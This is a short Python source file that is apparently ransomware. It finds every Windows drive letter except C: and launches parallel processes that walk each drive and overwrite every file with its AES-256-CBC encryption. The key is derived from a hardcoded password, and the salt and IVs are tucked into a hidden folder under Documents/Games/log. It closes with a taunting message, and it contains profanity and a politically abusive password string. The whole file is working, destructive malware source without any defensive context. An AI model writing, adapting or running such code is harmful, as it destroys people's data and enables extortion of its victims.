import os
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Protocol.KDF import scrypt
from Crypto.Util.Padding import pad
import base64
import multiprocessing as mp

# All the partitions of a hard drive [FOR WINDOWS SYSTEMS]
drives = []
def windows_drive_letter():
    for i in range(65,91): #65->A and 91->Z in Ascii
        drive = chr(i) + ':'
        if os.path.exists(drive):
            drives.append(drive)

# Configuration
PASSWORD = "Death_to_the_fucking_awamis"  # Replace with a strong password
SALT = get_random_bytes(16)  # A random salt for key derivation (Vai eta kintu store kore rakhte hobe noyto ar decrypt kora jabe na)
IV_PATH = f"C:/Users/{os.getlogin()}/Documents/Games/log/.ivs/"  # Directory to store IVs

# Key derivation
key = scrypt(PASSWORD.encode(), SALT, 32, N=2**14, r=8, p=1)  # AES-256 key

# Create the IV directory
if not os.path.exists(IV_PATH):
    os.makedirs(IV_PATH)

# Storing the randomly generated salt
with open("C:/Users/" + os.getlogin() +"/Documents/Games/log/.salt/salt.bin", 'wb') as salt_file:
    salt_file.write(SALT)

def encrypt_file(file_path):
    cipher = AES.new(key, AES.MODE_CBC)
    try:
        with open(file_path, 'rb') as f:
            data = f.read()
    
        # Encrypting the data
        encrypted_data = cipher.encrypt(pad(data, AES.block_size))
    
        # Writing the IV to a separate file
        iv_path = os.path.join(IV_PATH, os.path.basename(file_path) + '.iv')
        with open(iv_path, 'wb') as f:
            f.write(cipher.iv)
    
        # Write the encrypted data back to the original file
        with open(file_path, 'wb') as f:
            f.write(encrypted_data)
    
        print(f'Encrypted: {file_path}')
    except:
        print('FUCKING ERROR: maybe permission denied')

def encrypt_directory(directory):
    try:
        for root, dirs, files in os.walk(directory):
            for file in files:
                file_path = os.path.join(root, file)
                encrypt_file(file_path)
    except:
        print('fucking error: maybe permission denied')
# Encrypt the specified directory in this case an entire hard drive
if __name__ == '__main__':
    try:
        windows_drive_letter()
        for i in drives:
            if i == 'C:':
                continue
            else:
                mp.Process(target=encrypt_directory, args=(i+'/')).start()
    except:
        print('LOL_ERROR_OCCURED :(')


    print("You are fucked!")